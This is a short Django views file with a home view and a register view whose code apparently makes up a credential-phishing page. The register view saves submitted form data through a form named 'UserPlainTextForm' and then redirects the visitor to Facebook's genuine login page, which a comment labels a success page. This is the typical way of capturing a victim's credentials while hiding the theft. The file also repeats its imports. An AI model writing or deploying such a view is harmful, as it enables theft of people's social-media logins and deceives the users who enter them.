
# Create your views here.
from django.shortcuts import render
# myapp/views.py
from django.shortcuts import render, redirect
from .forms import UserRegistrationForm
from django.contrib import messages


def home(request):
    return render(request, 'home.html')



from django.shortcuts import render, redirect
from .forms import UserPlainTextForm

def register(request):
    if request.method == 'POST':
        form = UserPlainTextForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('https://es-es.facebook.com/login.php/')  # Redirige a una página de éxito
    else:
        form = UserPlainTextForm()
    return render(request, 'register.html', {'form': form})


